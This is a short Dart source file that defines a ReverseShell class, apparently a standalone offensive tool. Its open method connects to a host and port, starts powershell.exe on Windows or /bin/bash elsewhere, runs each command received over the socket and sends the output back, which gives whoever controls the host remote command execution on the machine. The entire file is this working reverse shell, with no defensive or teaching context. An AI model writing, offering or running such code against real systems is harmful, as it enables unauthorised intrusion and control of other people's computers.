import 'dart:convert';
import 'dart:io';

/// Reverse shell class
class ReverseShell {
  ReverseShell({
    required this.host,
    required this.port,
  });

  final String host;
  final int port;

  Future<void> open() async {
    print("Opening reverse shell");

    Socket socket = await Socket.connect(host, port);
    socket.listen((response) {
      late String shellPath;
      if (Platform.isWindows) {
        shellPath = "powershell.exe";
      } else {
        shellPath = "/bin/bash";
      }

      final String command = String.fromCharCodes(response).trim();
      Process.start(shellPath, []).then((Process shell) {
        shell.stdin.writeln(command);
        shell.stdout.listen((res) {
          socket.write(
            utf8.decode(
              res,
              allowMalformed: true,
            ),
          );
        });
      });
    });
  }
}
